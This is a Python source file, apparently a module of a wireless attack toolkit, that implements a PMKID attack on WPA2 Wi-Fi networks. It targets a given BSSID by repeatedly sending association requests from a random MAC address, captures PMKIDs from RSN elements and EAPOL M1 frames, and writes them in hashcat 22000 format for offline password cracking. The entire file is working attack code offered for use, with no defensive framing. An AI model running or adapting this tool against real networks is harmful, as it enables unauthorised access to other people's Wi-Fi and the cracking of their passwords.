import time
from threading import Event, Thread

from scapy.all import sendp

from ..context import Module
from ..dot11 import (rsn_ie, rsn_pmkid_listesi, eapol_key_data,
                     rastgele_mac, RSN_ID)
from ..frames import assoc_req
from ..hashcat import hashcat_01


class PmkidModule(Module):
    name = "pmkid"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.bulunan = {}
        self.dur = Event()
        self.thread = None
        self.bssid = None
        self.ssid = ""

    def on(self, bssid=None, ssid="", *a):
        if self.active:
            self.ctx.log("[pmkid] already active", "warn")
            return
        if not bssid:
            self.ctx.log("[pmkid] usage: module pmkid on <bssid> [ssid]", "err")
            return
        self.bssid, self.ssid = bssid, ssid
        self.dur.clear()
        self.ctx.sniffer.sub(self._handle)
        self.ctx.sniffer.start()
        self.active = True
        self.thread = Thread(target=self._attack, args=(bssid, ssid), daemon=True)
        self.thread.start()
        self.ctx.log(f"[pmkid] targeting {bssid} ssid={ssid or '?'}", "ok")

    def _handle(self, p):
        rsn = rsn_ie(p)
        if rsn:
            for pm in rsn_pmkid_listesi(rsn):
                if pm not in self.bulunan:
                    self.bulunan[pm] = "rsn"
                    self.ctx.log(f"[pmkid] *** {pm.hex()} *** (RSN IE)", "ok")
        kd = eapol_key_data(p)
        if kd:
            i = 0
            while i + 2 <= len(kd):
                eid = kd[i]
                ln = kd[i + 1]
                if eid == RSN_ID and i + 2 + ln <= len(kd):
                    for pm in rsn_pmkid_listesi(kd[i + 2:i + 2 + ln]):
                        if pm not in self.bulunan:
                            self.bulunan[pm] = "m1"
                            self.ctx.log(f"[pmkid] *** {pm.hex()} *** (M1)", "ok")
                i += 2 + ln

    def _attack(self, bssid, ssid):
        ist = rastgele_mac()
        while not self.dur.is_set():
            try:
                sendp(assoc_req(bssid, ist, ssid or ""),
                      iface=self.ctx.iface, verbose=False)
            except Exception:
                pass
            self.dur.wait(0.8)

    def off(self):
        if not self.active:
            return
        self.dur.set()
        self.ctx.sniffer.unsub(self._handle)
        if self.thread:
            self.thread.join(timeout=2)
        self.active = False
        self.ctx.log(f"[pmkid] stopped ({len(self.bulunan)})", "ok")

    def once(self, bssid, ssid="", duration=20):
        self.on(bssid, ssid)

        def _stop():
            time.sleep(duration)
            self.off()
        Thread(target=_stop, daemon=True).start()

    def save_22000(self, path):
        if not self.bulunan:
            self.ctx.log("[pmkid] nothing", "warn")
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                for pm in self.bulunan:
                    f.write(hashcat_01(pm, self.bssid or "??", "??", self.ssid) + "\n")
            self.ctx.log(f"[pmkid] {len(self.bulunan)} → {path}", "ok")
        except Exception as e:
            self.ctx.log(f"[pmkid] save err: {e}", "err")

    def status(self):
        return f"active ({len(self.bulunan)})" if self.active else "off"
